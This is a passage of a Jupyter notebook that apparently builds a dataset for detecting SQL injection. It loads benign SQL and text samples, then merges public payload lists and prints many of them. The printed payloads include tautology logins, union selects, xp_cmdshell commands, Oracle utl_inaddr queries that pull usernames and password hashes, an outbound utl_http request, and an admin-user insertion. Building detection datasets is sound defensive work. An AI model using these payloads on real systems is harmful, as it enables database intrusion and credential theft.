       "0                     ALTER SYSTEM FLUSH SHARED_POOL\n",
       "1  ALTER TABLE metadatacollectionschema.altidcoll...\n",
       "2  ALTER TABLE metadatacollectionschema.andsactiv...\n",
       "3  ALTER TABLE metadatacollectionschema.andsparty...\n",
       "4  ALTER TABLE metadatacollectionschema.andsservi..."
      ]
     },
     "execution_count": 112,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 1003 entries, 0 to 1002\n",
      "Data columns (total 1 columns):\n",
      " #   Column  Non-Null Count  Dtype \n",
      "---  ------  --------------  ----- \n",
      " 0   benign  1003 non-null   object\n",
      "dtypes: object(1)\n",
      "memory usage: 8.0+ KB\n"
     ]
    }
   ],
   "source": [
    "df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['ALTER SYSTEM FLUSH SHARED_POOL',\n",
       "       'ALTER TABLE metadatacollectionschema.altidcollection OWNER TO omerouser',\n",
       "       'ALTER TABLE metadatacollectionschema.andsactivity OWNER TO omerouser',\n",
       "       'ALTER TABLE metadatacollectionschema.andsparty OWNER TO omerouser',\n",
       "       'ALTER TABLE metadatacollectionschema.andsservice OWNER TO omerouser'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "legit_plain_text=df['benign'].values\n",
    "legit_plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./dataset/collected payloads/SuperCowPowers/legit.txt'\n",
    "legit_list=[]\n",
    "file= open(path, \"r\", encoding=\"utf8\") # open file with a mode=r (read only mode\n",
    "for i in file:\n",
    "    legit_list.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['ALTER SYSTEM FLUSH SHARED_POOL\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.altidcollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.andsactivity OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.andsparty OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.andsservice OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.contributorcollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.custodiancollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.dataformatscollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.fundingcollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.guestusersgroup OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.metadatacollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.metadatamedia OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.microscopecollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.portalimportdetails OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.projectscollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.publishercollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.relatedurlscollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.subjectforcollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE metadatacollectionschema.subjectseoccollection OWNER TO omerouser\\n',\n",
       " 'ALTER TABLE products ADD CONSTRAINT pk_products PRIMARY KEY (id) CREATE TABLE patches ( id int PRIMARY KEY, patch int, product int FOREIGN KEY REFERENCES products(id), release date )\\n']"
      ]
     },
     "execution_count": 136,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "legit_list[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['ALTER SYSTEM FLUSH SHARED_POOL',\n",
       " 'ALTER TABLE metadatacollectionschema.altidcollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.andsactivity OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.andsparty OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.andsservice OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.contributorcollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.custodiancollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.dataformatscollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.fundingcollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.guestusersgroup OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.metadatacollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.metadatamedia OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.microscopecollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.portalimportdetails OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.projectscollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.publishercollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.relatedurlscollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.subjectforcollection OWNER TO omerouser',\n",
       " 'ALTER TABLE metadatacollectionschema.subjectseoccollection OWNER TO omerouser',\n",
       " 'ALTER TABLE products ADD CONSTRAINT pk_products PRIMARY KEY  ( id )  CREATE TABLE patches  (  id int PRIMARY KEY, patch int, product int FOREIGN KEY REFERENCES products ( id ) , release date  ) ']"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "SuperPowers_legit= cleanData(legit_list)\n",
    "SuperPowers_legit[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1003\n"
     ]
    }
   ],
   "source": [
    "print(len(SuperPowers_legit))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 5) Scott-park (benign data)\n",
    "\n",
    "source: https://github.com/Scott-Park/MachineLearning/blob/master/Sql-Injection/source/trainingdata/plain.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [],
   "source": [
    "#read benign data\n",
    "path='./dataset/collected payloads/Scott'\n",
    "file=\"plain.txt\"\n",
    "df = pd.read_csv(os.path.join(path, file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python',  encoding=\"utf8\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>“Ne te quaesiveris extra.”</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>“Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                    “Ne te quaesiveris extra.”\n",
       "2   “Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 118,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', '“Ne te quaesiveris extra.”',\n",
       "       '“Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text=df['benign'].values\n",
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert from list to string\n",
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [],
   "source": [
    "# filtering data from foreign words\n",
    "\n",
    "stop_words = set(stopwords.words('english')) \n",
    "\n",
    "def filtering_words(posts):\n",
    "\n",
    "    filtered=''\n",
    "    \n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    \n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=filtering_words(data)  # filtering data\n",
    "data=data.split('.')              # split sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text “Ne te quaesiveris extra',\n",
       " '” “Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " '” Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 123,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "# seperate words inside tags\n",
    "\n",
    "for i in range(len(data)):\n",
    "    data[i]=data[i].replace('<', ' <')\n",
    "    data[i]=data[i].replace('>', '> ')\n",
    "    data[i]=data[i].replace('=', ' = ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text “Ne te quaesiveris extra',\n",
       " '” “Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " '” Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3440\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(data))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Combination of all sqli datasets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 166,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentences=foospidy_sqli+libinjection_sqli+camoufl4g3_sqli+Burp_sqli_error_based+Burp_sqli_time_based+Burp_sqli_union_select+Burp_sqli_escape_chars+FuzzDB_GenericBlind+FuzzDB_payloads_sql_blind_MSSQL_INSERT+FuzzDB_payloads_sql_blind_MSSQL_WHERE+FuzzDB_payloads_sql_blind_MySQL_INSERT+FuzzDB_payloads_sql_blind_MySQL_ORDER_BY+FuzzDB_payloads_sql_blind_MySQL_WHERE+SuperPowers_SQL_3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 167,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "14457\n"
     ]
    }
   ],
   "source": [
    "print(len(all_sqli_sentences))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 168,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " 'a',\n",
       " '1 or 1 = 1',\n",
       " \"1' or '1' = '1\",\n",
       " \"1 and user_name (  )   =  'dbo'\",\n",
       " '1',\n",
       " \"1'1\",\n",
       " '1 exec sp_  ( or exec xp_ ) ',\n",
       " '1 and 1 = 1',\n",
       " \"1' and 1 =  ( select count ( * )  from tablenames ) ; --\",\n",
       " '1',\n",
       " \"1 and user_name (  )   =  'dbo'\",\n",
       " \"\\\\'; desc users; --\",\n",
       " \"1\\\\'1\",\n",
       " \"1' and non_existant_table  =  '1\",\n",
       " \"' or username is not NULL or username  =  '\",\n",
       " \"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116\",\n",
       " \"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --\",\n",
       " '1 uni/**/on select all from where',\n",
       " 'â€™ or â€˜1â€™ = â€™1',\n",
       " \"' or '1' = '1\",\n",
       " \"'||utl_http.request ( 'httP://192.168.1.1/' ) ||'\",\n",
       " \"' || myappadmin.adduser ( 'admin', 'newpass' )  || '\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i\",\n",
       " \"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  \",\n",
       " '||6',\n",
       " \"'||'6\",\n",
       " ' ( ||6 ) ',\n",
       " \"' or 1 = 1-- \",\n",
       " 'or 1 = 1',\n",
       " \"' or '1' = '1\",\n",
       " \"; or '1' = '1'\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' or '7659' = '7659\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' -- \",\n",
       " \"' or 1 = 1--\",\n",
       " '\" or 1 = 1--',\n",
       " \"' or 1 = 1 /*\",\n",
       " 'or 1 = 1--',\n",
       " \"' or 'a' = 'a\",\n",
       " '\" or \"a\" = \"a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " \"admin' or '\",\n",
       " \"' select * from information_schema.tables--\",\n",
       " ' )  union select * from information_schema.tables;',\n",
       " \"' having 1 = 1--\",\n",
       " \"' having 1 = 1--\",\n",
       " \"' group by userid having 1 = 1--\",\n",
       " \"' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --\",\n",
       " \"' or 1 in  ( select @@version ) --\",\n",
       " \"' union all select @@version--\",\n",
       " \"' or 'unusual'  =  'unusual'\",\n",
       " \"' or 'something'  =  'some'+'thing'\",\n",
       " \"' or 'text'  =  n'text'\",\n",
       " \"' or 'something' like 'some%'\",\n",
       " \"' or 2 > 1\",\n",
       " \"' or 'text' > 't'\",\n",
       " \"' or 'whatever' in  ( 'whatever' ) \",\n",
       " \"' or 2 between 1 and 3\",\n",
       " \"' or username like char ( 37 ) ;\",\n",
       " \"' union select * from users where login  =  char ( 114,111,111,116 ) ;\",\n",
       " \"' union select \",\n",
       " 'password:*/ = 1--',\n",
       " 'uni/**/on sel/**/ect',\n",
       " \"'; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " \"'; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
       " \"'/**/or/**/1/**/ = /**/1\",\n",
       " \"' or 1/*\",\n",
       " ' or isNULL ( 1/0 )  /*',\n",
       " \"' or '7659' = '7659\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " \"' -- &password = \",\n",
       " \"'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > \",\n",
